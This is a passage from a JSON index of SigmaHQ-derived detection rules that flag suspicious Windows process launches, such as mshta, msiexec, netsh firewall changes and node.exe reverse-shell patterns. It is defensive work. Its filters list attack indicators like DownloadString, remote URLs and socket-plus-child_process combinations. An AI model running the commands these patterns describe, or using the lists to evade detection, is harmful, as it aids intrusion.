evt.Parsed.CommandLine contains '.htm' || evt.Parsed.CommandLine contains '.hta' || evt.Parsed.CommandLine endsWith 'mshta.exe' || evt.Parsed.CommandLine endsWith 'mshta'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1106\n\n  label: \"Suspicious Mshta.EXE Execution Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious mshta process execution patterns\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_susp_pattern.yml", "version": "0.2", "versions": {"0.1": {"digest": "4643ff6711cede35de8b4afd4155b907d97aa6061cea2afd44109efb05806755"}, "0.2": {"digest": "6cd7f48332ec2e832c32fd06f1036d0b2055be3390297ae68c5a70eaed6bde93"}}}, "sigmahq/proc_creation_win_msiexec_masquerading": {"content": "type: trigger\nname: sigmahq/proc_creation_win_msiexec_masquerading\ndescription: |\n  Detects the execution of msiexec.exe from an uncommon directory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.OriginalFileName == '\\\\msiexec.exe') && not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\System32\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\WinSxS\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.005\n\n  label: \"Potential MsiExec Masquerading\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of msiexec.exe from an uncommon directory\n", "path": "scenarios/sigmahq/proc_creation_win_msiexec_masquerading.yml", "version": "0.2", "versions": {"0.1": {"digest": "1edb9747ca62478c7d1dfad68428c7bd243d0a3e61f4cb776ca390d63affef28"}, "0.2": {"digest": "0910088816215ad69ad846f15f40002c675534b4457d2b87b6d45d960672b5e1"}}}, "sigmahq/proc_creation_win_msra_process_injection": {"content": "type: trigger\nname: sigmahq/proc_creation_win_msra_process_injection\ndescription: |\n  Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\msra.exe' && evt.Parsed.ParentCommandLine endsWith 'msra.exe' && (evt.Parsed.Image endsWith '\\\\arp.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\netstat.exe' || evt.Parsed.Image endsWith '\\\\nslookup.exe' || evt.Parsed.Image endsWith '\\\\route.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055\n\n  label: \"Potential Process Injection Via Msra.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics\n", "path": "scenarios/sigmahq/proc_creation_win_msra_process_injection.yml", "version": "0.2", "versions": {"0.1": {"digest": "d87721a59e9ced20473a911630dda8032e8ccabdf81112e81762e7026f6c9a2f"}, "0.2": {"digest": "4470669cfe7179a567b7d0810c764780176bab2099f12093df761cce48c7ea1e"}}}, "sigmahq/proc_creation_win_mssql_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mssql_susp_child_process\ndescription: |\n  Detects suspicious child processes of the SQLServer process. This could indicate potential RCE or SQL Injection.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\sqlservr.exe' && (evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\netstat.exe' || evt.Parsed.Image endsWith '\\\\nltest.exe' || evt.Parsed.Image endsWith '\\\\ping.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\tasklist.exe' || evt.Parsed.Image endsWith '\\\\wsl.exe') && not (evt.Parsed.ParentImage startsWith 'C:\\\\Program Files\\\\Microsoft SQL Server\\\\' && evt.Parsed.ParentImage endsWith 'DATEV_DBENGINE\\\\MSSQL\\\\Binn\\\\sqlservr.exe' && evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\cmd.exe' && evt.Parsed.CommandLine startsWith '\"C:\\\\Windows\\\\system32\\\\cmd.exe\" '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.003\n   - attack.t1190\n\n  label: \"Suspicious Child Process Of SQL Server\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of the SQLServer process. This could indicate potential RCE or SQL Injection.\n", "path": "scenarios/sigmahq/proc_creation_win_mssql_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "2492ce3f8083524440f536daf6ad422fffee8c683d5a455b5dc3895a2aa22867"}, "0.2": {"digest": "23b131547c0f6e07b10205c66346e10ec7c208f7228af2de650e29c91522b551"}}}, "sigmahq/proc_creation_win_mssql_veaam_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mssql_veaam_susp_child_processes\ndescription: |\n  Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\sqlservr.exe' && evt.Parsed.ParentCommandLine contains 'VEEAMSQL' && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wsl.exe' || evt.Parsed.Image endsWith '\\\\wt.exe') && (evt.Parsed.CommandLine contains '-ex ' || evt.Parsed.CommandLine contains 'bypass' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'DownloadString' || evt.Parsed.CommandLine contains 'http://' || evt.Parsed.CommandLine contains 'https://' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'copy ') || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.Image endsWith '\\\\netstat.exe' || evt.Parsed.Image endsWith '\\\\nltest.exe' || evt.Parsed.Image endsWith '\\\\ping.exe' || evt.Parsed.Image endsWith '\\\\tasklist.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Child Process Of Veeam Dabatase\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.\n", "path": "scenarios/sigmahq/proc_creation_win_mssql_veaam_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "c1d9d4b845caf820326fa90a3ae69e463aa88ce0aee65f087deb0ee283628086"}, "0.2": {"digest": "1bdd29b8fc686f7a084a5a89bf4823e9c8db6e17bae7ebcdf148711ad1e1ee4c"}}}, "sigmahq/proc_creation_win_mstsc_rdp_hijack_shadowing": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mstsc_rdp_hijack_shadowing\ndescription: |\n  Detects RDP session hijacking by using MSTSC shadowing\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'noconsentprompt' && evt.Parsed.CommandLine contains 'shadow:')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1563.002\n\n  label: \"Potential MSTSC Shadowing Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects RDP session hijacking by using MSTSC shadowing\n", "path": "scenarios/sigmahq/proc_creation_win_mstsc_rdp_hijack_shadowing.yml", "version": "0.2", "versions": {"0.1": {"digest": "5aeb9512705c2918c34a42d34d7b63da102a7f21145dc8077fcc966f1bcaff30"}, "0.2": {"digest": "64c60cd21ed0d28839d8d36e18b1316aa7d0350072b52c21d245f29cbeee9df1"}}}, "sigmahq/proc_creation_win_mstsc_run_local_rdp_file_susp_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mstsc_run_local_rdp_file_susp_location\ndescription: |\n  Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mstsc.exe' || evt.Parsed.OriginalFileName == 'mstsc.exe') && (evt.Parsed.CommandLine endsWith '.rdp' || evt.Parsed.CommandLine endsWith '.rdp\"') && (evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Tasks_Migrated ' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tracing\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1219\n\n  label: \"Suspicious Mstsc.EXE Execution With Local RDP File\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\n", "path": "scenarios/sigmahq/proc_creation_win_mstsc_run_local_rdp_file_susp_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "0b3b24cece665f7b94e49959c96deda58b8990dc528dfe42e0b4186eebcad9cb"}, "0.2": {"digest": "0ff0a3a4c24bd7e95cfb761cb54af045ddad3b283d65cc73a76f48d4daf3e399"}}}, "sigmahq/proc_creation_win_mstsc_run_local_rpd_file_susp_parent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mstsc_run_local_rpd_file_susp_parent\ndescription: |\n  Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\brave.exe' || evt.Parsed.ParentImage endsWith '\\\\CCleanerBrowser.exe' || evt.Parsed.ParentImage endsWith '\\\\chrome.exe' || evt.Parsed.ParentImage endsWith '\\\\chromium.exe' || evt.Parsed.ParentImage endsWith '\\\\firefox.exe' || evt.Parsed.ParentImage endsWith '\\\\iexplore.exe' || evt.Parsed.ParentImage endsWith '\\\\microsoftedge.exe' || evt.Parsed.ParentImage endsWith '\\\\msedge.exe' || evt.Parsed.ParentImage endsWith '\\\\opera.exe' || evt.Parsed.ParentImage endsWith '\\\\vivaldi.exe' || evt.Parsed.ParentImage endsWith '\\\\whale.exe' || evt.Parsed.ParentImage endsWith '\\\\outlook.exe') && (evt.Parsed.Image endsWith '\\\\mstsc.exe' || evt.Parsed.OriginalFileName == 'mstsc.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Mstsc.EXE Execution From Uncommon Parent\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.\n", "path": "scenarios/sigmahq/proc_creation_win_mstsc_run_local_rpd_file_susp_parent.yml", "version": "0.2", "versions": {"0.1": {"digest": "bad4a6b2a7494af495449a777f5bea40905cc37acebc942ad9cc6eb42b78b6b3"}, "0.2": {"digest": "f1c7cd4a9cb23b91fd1ad67a32b1e5514ee666128b84f1ea68412e4b5805bd15"}}}, "sigmahq/proc_creation_win_msxsl_remote_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_msxsl_remote_execution\ndescription: |\n  Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\msxsl.exe' && evt.Parsed.CommandLine contains 'http')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1220\n\n  label: \"Remote XSL Execution Via Msxsl.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\n", "path": "scenarios/sigmahq/proc_creation_win_msxsl_remote_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "664e62bfb1cad745e3555fb1d67ea73c65de750715ebf15d22a17a724b74dd8c"}, "0.2": {"digest": "79afd0c40f251a54e69baac8b7579671c646fc0a30a2ee76f824dff54185adfb"}}}, "sigmahq/proc_creation_win_net_use_mount_internet_share": {"content": "type: trigger\nname: sigmahq/proc_creation_win_net_use_mount_internet_share\ndescription: |\n  Detects when an internet hosted webdav share is mounted using the \"net.exe\" utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.OriginalFileName in ['net.exe', 'net1.exe']) && evt.Parsed.CommandLine contains ' use ' && evt.Parsed.CommandLine contains ' http')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.002\n\n  label: \"Windows Internet Hosted WebDav Share Mount Via Net.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when an internet hosted webdav share is mounted using the \"net.exe\" utility\n", "path": "scenarios/sigmahq/proc_creation_win_net_use_mount_internet_share.yml", "version": "0.2", "versions": {"0.1": {"digest": "42a7e4c4c34ef8da19507fd943e780dfbdc85cd05e42021d5920a40054f749b3"}, "0.2": {"digest": "ceebb8dc5e534b889f0a6556ecfe5d91e4309a43963e5ad7b028f9fcf56090ed"}}}, "sigmahq/proc_creation_win_net_user_add_never_expire": {"content": "type: trigger\nname: sigmahq/proc_creation_win_net_user_add_never_expire\ndescription: |\n  Detects creation of local users via the net.exe command with the option \"never expire\"\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.OriginalFileName in ['net.exe', 'net1.exe']) && evt.Parsed.CommandLine contains 'user' && evt.Parsed.CommandLine contains 'add' && evt.Parsed.CommandLine contains 'expires:never')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1136.001\n\n  label: \"New User Created Via Net.EXE With Never Expire Option\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects creation of local users via the net.exe command with the option \"never expire\"\n", "path": "scenarios/sigmahq/proc_creation_win_net_user_add_never_expire.yml", "version": "0.2", "versions": {"0.1": {"digest": "744c0e143a503a1ea2be55fb99debc29f47e261eb31bf570c3af0c8b618ae4f8"}, "0.2": {"digest": "dc922c207b9c69cdf4e2720759385b70ce02d2fba5ee454dc7d3d241e1156666"}}}, "sigmahq/proc_creation_win_net_user_default_accounts_manipulation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_net_user_default_accounts_manipulation\ndescription: |\n  Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.OriginalFileName in ['net.exe', 'net1.exe']) && evt.Parsed.CommandLine contains ' user ' && (evt.Parsed.CommandLine contains ' J\u00e4rjestelm\u00e4nvalvoja ' || evt.Parsed.CommandLine contains ' Rendszergazda ' || evt.Parsed.CommandLine contains ' \u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440 ' || evt.Parsed.CommandLine contains ' Administrateur ' || evt.Parsed.CommandLine contains ' Administrador ' || evt.Parsed.CommandLine contains ' Administrat\u00f6r ' || evt.Parsed.CommandLine contains ' Administrator ' || evt.Parsed.CommandLine contains ' guest ' || evt.Parsed.CommandLine contains ' DefaultAccount ' || evt.Parsed.CommandLine contains ' \"J\u00e4rjestelm\u00e4nvalvoja\" ' || evt.Parsed.CommandLine contains ' \"Rendszergazda\" ' || evt.Parsed.CommandLine contains ' \"\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\" ' || evt.Parsed.CommandLine contains ' \"Administrateur\" ' || evt.Parsed.CommandLine contains ' \"Administrador\" ' || evt.Parsed.CommandLine contains ' \"Administrat\u00f6r\" ' || evt.Parsed.CommandLine contains ' \"Administrator\" ' || evt.Parsed.CommandLine contains ' \"guest\" ' || evt.Parsed.CommandLine contains ' \"DefaultAccount\" ' || evt.Parsed.CommandLine contains ' \\'J\u00e4rjestelm\u00e4nvalvoja\\' ' || evt.Parsed.CommandLine contains ' \\'Rendszergazda\\' ' || evt.Parsed.CommandLine contains ' \\'\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\\' ' || evt.Parsed.CommandLine contains ' \\'Administrateur\\' ' || evt.Parsed.CommandLine contains ' \\'Administrador\\' ' || evt.Parsed.CommandLine contains ' \\'Administrat\u00f6r\\' ' || evt.Parsed.CommandLine contains ' \\'Administrator\\' ' || evt.Parsed.CommandLine contains ' \\'guest\\' ' || evt.Parsed.CommandLine contains ' \\'DefaultAccount\\' ') && not (evt.Parsed.CommandLine contains 'guest' && evt.Parsed.CommandLine contains '/active no'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1560.001\n\n  label: \"Suspicious Manipulation Of Default Accounts Via Net.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc\n", "path": "scenarios/sigmahq/proc_creation_win_net_user_default_accounts_manipulation.yml", "version": "0.2", "versions": {"0.1": {"digest": "0ecbbfe2e44fe46c7d07c0ffd9725baefddf0c44397402312587513e357ee355"}, "0.2": {"digest": "0fef93527885c035029cd3777bf81b414f2f07a2e5de29984174822bd47dffb9"}}}, "sigmahq/proc_creation_win_netsh_fw_allow_program_in_susp_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_netsh_fw_allow_program_in_susp_location\ndescription: |\n  Detects Netsh command execution that whitelists a program located in a suspicious location in the Windows Firewall\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\netsh.exe' || evt.Parsed.OriginalFileName == 'netsh.exe') && (evt.Parsed.CommandLine contains 'firewall' && evt.Parsed.CommandLine contains 'add' && evt.Parsed.CommandLine contains 'allowedprogram' || evt.Parsed.CommandLine contains 'advfirewall' && evt.Parsed.CommandLine contains 'firewall' && evt.Parsed.CommandLine contains 'add' && evt.Parsed.CommandLine contains 'rule' && evt.Parsed.CommandLine contains 'action=allow' && evt.Parsed.CommandLine contains 'program=') && (evt.Parsed.CommandLine contains ':\\\\$Recycle.bin\\\\' || evt.Parsed.CommandLine contains ':\\\\RECYCLER.BIN\\\\' || evt.Parsed.CommandLine contains ':\\\\RECYCLERS.BIN\\\\' || evt.Parsed.CommandLine contains ':\\\\SystemVolumeInformation\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Default\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Desktop\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\addins\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\cursors\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\debug\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\drivers\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\fonts\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\help\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\system32\\\\tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Local Settings\\\\Temporary Internet Files\\\\' || evt.Parsed.CommandLine contains '\\\\Temporary Internet Files\\\\Content.Outlook\\\\' || evt.Parsed.CommandLine contains '%Public%\\\\' || evt.Parsed.CommandLine contains '%TEMP%' || evt.Parsed.CommandLine contains '%TMP%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.004\n\n  label: \"Suspicious Program Location Whitelisted In Firewall Via Netsh.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Netsh command execution that whitelists a program located in a suspicious location in the Windows Firewall\n", "path": "scenarios/sigmahq/proc_creation_win_netsh_fw_allow_program_in_susp_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "941ab43ef3fd7de50c0fde9b254769bd2ba6115ff9250f42feb8a2db2be62e9a"}, "0.2": {"digest": "569420b6a8a8d6d1eafbf7f87335b80a89f7dd82d5599e0117ea236b1cdccccf"}}}, "sigmahq/proc_creation_win_netsh_fw_allow_rdp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_netsh_fw_allow_rdp\ndescription: |\n  Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\netsh.exe' || evt.Parsed.OriginalFileName == 'netsh.exe') && evt.Parsed.CommandLine contains 'firewall ' && evt.Parsed.CommandLine contains 'add ' && evt.Parsed.CommandLine contains 'tcp ' && evt.Parsed.CommandLine contains '3389' && (evt.Parsed.CommandLine contains 'portopening' || evt.Parsed.CommandLine contains 'allow'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.004\n\n  label: \"RDP Connection Allowed Via Netsh.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\n", "path": "scenarios/sigmahq/proc_creation_win_netsh_fw_allow_rdp.yml", "version": "0.2", "versions": {"0.1": {"digest": "802fe7ccfaa9775bda2603553475796444f7f023c5b238b53e0f61137bf83834"}, "0.2": {"digest": "9ed766ce953d190ce9f377023b68d91ac52dbdf15927ebc490f4746e03523cac"}}}, "sigmahq/proc_creation_win_netsh_port_forwarding_3389": {"content": "type: trigger\nname: sigmahq/proc_creation_win_netsh_port_forwarding_3389\ndescription: |\n  Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\netsh.exe' || evt.Parsed.OriginalFileName == 'netsh.exe') && evt.Parsed.CommandLine contains ' i' && evt.Parsed.CommandLine contains ' p' && evt.Parsed.CommandLine contains '=3389' && evt.Parsed.CommandLine contains ' c')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090\n\n  label: \"RDP Port Forwarding Rule Added Via Netsh.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule\n", "path": "scenarios/sigmahq/proc_creation_win_netsh_port_forwarding_3389.yml", "version": "0.2", "versions": {"0.1": {"digest": "757215bd33912b8cf170d9424ecccfbb9eec9cd2ba90ed2b63cb1b5058f664ce"}, "0.2": {"digest": "f03962f364d150d356cb035cbcda85c9407895d9c0f01762d3e8a009473d21b4"}}}, "sigmahq/proc_creation_win_node_abuse": {"content": "type: trigger\nname: sigmahq/proc_creation_win_node_abuse\ndescription: |\n  Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\node.exe' && (evt.Parsed.CommandLine contains ' -e ' || evt.Parsed.CommandLine contains ' --eval ') && evt.Parsed.CommandLine contains '.exec(' && evt.Parsed.CommandLine contains 'net.socket' && evt.Parsed.CommandLine contains '.connect' && evt.Parsed.CommandLine contains 'child_process')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1127\n\n  label: \"Potential Arbitrary Code Execution Via Node.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc\n", "path": "scenarios/sigmahq/proc_creation_win_node_abuse.yml", "version": "0.2", "versions": {"0.1": {"digest": "568138581ab66a3a22ca9ad7d4f9afc7e380655a6cb876ae3a579cca64eb9a9d"}, "0.2": {"digest": "1d84b618a18ffb8574229c3e9f41797347eca4cdf9fd138d486c610e2db8e3bb"}}}, "sigmahq/proc_creation_win_nslookup_domain_discovery": {"content": "type: trigger\nname: sigmahq/proc_creation_win_nslookup_domain_discovery\ndescription: |\n  Detects a set of suspicious network related commands often used in recon stages\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'nslookup' && evt.Parsed.CommandLine contains '_ldap._tcp.dc._msdcs.')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1087\n   - attack.t1082\n\n  label: \"Network Reconnaissance Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a set of suspicious network related commands often used in recon stages\n", "path": "scenarios/sigmahq/proc_creation_win_nslookup_domain_discovery.yml", "version": "0.2", "versions": {"0.1": {"digest": "83ca44adc662b156353533ad13057439fc95c3793dfb0a57fb00165e7ef6969b"}, "0.2": {"digest": "0af4a55fa1d04cbf666bde2e4d2dbf6dbad54fca39c8b194b330df6d4be8ad8e"}}}, "sigmahq/proc_creation_win_odbcconf_driver_install_susp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_odbcconf_driver_install_susp\ndescription: |\n  Detects execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension. This is often used as a defense evasion method.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\odbcconf.exe' || evt.Parsed.OriginalFileName == 'odbcconf.exe') && 